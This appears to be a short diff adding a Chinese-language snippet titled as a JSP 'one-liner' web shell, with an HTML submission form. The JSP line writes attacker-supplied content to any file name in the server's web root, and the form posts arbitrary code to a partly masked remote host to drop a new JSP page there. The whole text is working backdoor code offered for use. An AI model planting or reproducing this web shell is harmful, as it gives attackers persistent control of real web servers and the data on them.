@@ -1,0 +1,9 @@
+JSP一句话
+
+1) <% if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("\\")+request.getParameter("f"))).write(request.getParameter("t").getBytes()); %>
+
+　　提交客户端:
+　　<form action="http://59.x.x.x:8080/scdc/bob.jsp?f=fuckjp.jsp" method="post">
+　　<textarea name=t cols=120 rows=10 width=45>your code</textarea><BR><center><br>
+　　<input type=submit value="提交">
+　　</form>
